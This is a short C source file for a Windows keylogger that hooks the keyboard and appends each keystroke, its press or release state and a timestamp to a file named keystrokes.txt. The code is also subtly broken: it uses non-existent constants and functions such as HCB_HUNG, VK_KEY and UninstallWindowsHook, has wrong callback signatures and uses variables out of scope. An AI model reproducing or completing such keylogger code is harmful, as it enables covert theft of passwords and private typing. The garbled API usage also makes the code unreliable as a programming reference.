#include <Windows.h>
#include <winuser.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

typedef struct {
    int key;
    int state;
    int timestamp;
} Keystroke;

void recordKeystroke(int type, int key) {
    Keystroke log;
    log.key = key;
    log.state = type;
    log.timestamp = time(0);
    fwrite(&log, sizeof(Keystroke), 1, logFile);
}

void keyboardEventCallback(int nCode, int wParam, int lParam) {
    if (nCode == HCB_HUNG) {
        return;
    }
    if (wParam == VK_KEYDOWN) {
        recordKeystroke('P', GetAsyncKeyState(VK_KEY));
    } else if (wParam == VK_KEYUP) {
        recordKeystroke('R', GetAsyncKeyState(VK_KEY));
    }
}

void initKeyboardHook(void) {
    static HHOOK hKeyboardHook = 0;
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardEventCallback);
}

int main() {
    FILE *logFile = fopen("keystrokes.txt", "a");
    if (!logFile) {
        printf("Failed to create log file!\n");
        return 1;
    }

    initKeyboardHook();

    while (GetAsyncKeyState(VK_KEY)) {
        // Continue looping to capture keystrokes
    }

    UninstallWindowsHook(hKeyboardHook);
    fclose(logFile);
    printf("Keyboard hook removed and log file closed.\n");
    return 0;
}
```

